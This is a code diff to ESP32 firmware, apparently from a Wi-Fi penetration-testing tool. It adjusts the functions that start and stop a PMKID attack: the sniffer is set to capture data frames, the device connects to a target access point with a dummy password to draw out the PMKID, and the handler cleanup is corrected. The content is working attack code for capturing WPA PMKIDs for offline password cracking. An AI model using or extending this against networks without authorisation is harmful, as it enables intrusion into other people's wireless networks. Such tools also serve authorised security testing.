@@ -76,8 +76,8 @@ static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base
 void attack_pmkid_start(attack_config_t *attack_config){
     ESP_LOGI(TAG, "Starting PMKID attack...");
     ap_record = attack_config->ap_record;
-    wifictl_sniffer_filter_frame_types(true, false, false);
-    wifictl_sniffer_start(ap_record->primary);
+    // PMKIDs travel in EAPoL-Key frames carried over data frames.
+    wifictl_sniffer_start(ap_record->primary, WIFICTL_SNIFF_PKT_DATA);
     frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);
     wifictl_sta_connect_to_ap(ap_record, "dummypassword");
     ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler, NULL));
@@ -87,6 +87,6 @@ void attack_pmkid_stop(){
     wifictl_sta_disconnect();
     wifictl_sniffer_stop();
     frame_analyzer_capture_stop();
-    ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &pmkid_exit_condition_handler));
+    ESP_ERROR_CHECK(esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler));
     ESP_LOGD(TAG, "PMKID attack stopped");
 }
